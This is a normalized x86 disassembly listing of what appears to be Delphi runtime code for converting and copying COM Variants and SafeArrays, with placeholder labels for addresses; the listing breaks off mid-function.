push sub_40e883
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4104e4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4104e4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e88a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f0c
retn
sub_40e890
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e8da
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e8e1
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40e8e4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e973
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4104e4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4104e4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e97a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f0c
retn
sub_40e980
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e9ca
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9d1
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40e9d4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ec19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec20
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f0c
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403f0c
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
dec eax
je r-xdata
call sub_40e7a0
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
jmp r-xdata
call sub_40e890
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b1c0
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
jmp r-xdata
sub_40ec34
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e7f4
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e8e4
jmp r-xdata
jmp r-xdata
call sub_40e9d4
sub_40ec68
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ecb2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ecb9
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40ecd0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ed00
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ed00
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ed5c
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ec28
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ec28
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ecd0
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ec28
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ec28
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40ed00
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ec28
mov eax [ ebp - 0x314 ]
call sub_40ef54
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40eed8
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ec28
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403ee8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_410940
test al al
je r-xdata
mov eax ebx
call sub_40ed5c
jmp r-xdata
push ebx
call VariantClear
call sub_40ec28
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40ef70
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40efa0
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40efa0
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40effc
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ec28
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ec28
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40ef54
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e980
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ec28
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ec28
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ef70
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40efa0
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ec28
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ec28
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f1d0
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40eed8
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ec28
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403f3c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_410940
test al al
je r-xdata
mov ecx sub_40f1c8
mov edx esi
mov eax ebx
call sub_40effc
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ec28
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f27c
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f1d0
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40eed8
sub_40f2c0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4045c8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ec34
pop ebx
pop ebp
retn 0x8
sub_40f2f8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4045c8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ec34
pop ebx
pop ebp
retn 0x8
sub_40f330
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f3e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4045c8
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ec34
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f3ed
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f0c
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404170
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407c24
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404714
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404170
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407be8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404714
jmp r-xdata
jmp r-xdata
call sub_40e890
sub_40f3f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f4b3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f491
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ec34
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4046d8
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404170
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f498
lea eax [ ebp - 0x10 ]
call sub_40ef54
retn
sub_40f4c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f516
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f27c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f5a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f51d
lea eax [ ebp - 0x10 ]
call sub_40ef54
retn
sub_40f524
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410940
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f599
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403f3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ef54
retn
sub_40f5a8
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40fadf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f5e1 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f3c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403ee8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407f38
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403f3c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407f38
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403f3c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4097c0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f3c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4097c0
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403f3c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40f2c0
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404170
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40f2f8
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404170
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_4046d8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c4
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404170
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40f330
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404170
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407f38
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403f3c
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407f38
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403f3c
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407f38
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403f3c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_408024
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403f3c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_408024
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403f3c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f5a8
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f3f4
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403f3c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fae6
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403f0c
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4045e0
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403f0c
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4045e0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f0c
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40f4c0
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403f3c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403f3c
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e7f4
test ah 0x40
je r-xdata
mov eax esi
call sub_403ee8
mov edx eax
mov eax ebx
call sub_40f524
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40f3f4
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403f3c
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f3f4
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403f3c
jmp r-xdata
jmp [ eax * 4 + jump_table_40f875 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f38
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403f3c
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407f38
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403f3c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4097c0
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403f3c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_4097c0
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403f3c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40f2c0
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404170
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40f2f8
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404170
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404110
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40f330
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404170
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f38
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403f3c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f38
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403f3c
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f38
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403f3c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_408024
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403f3c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_408024
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403f3c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f5a8
jmp r-xdata
sub_40faec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40fb96
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fb79
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
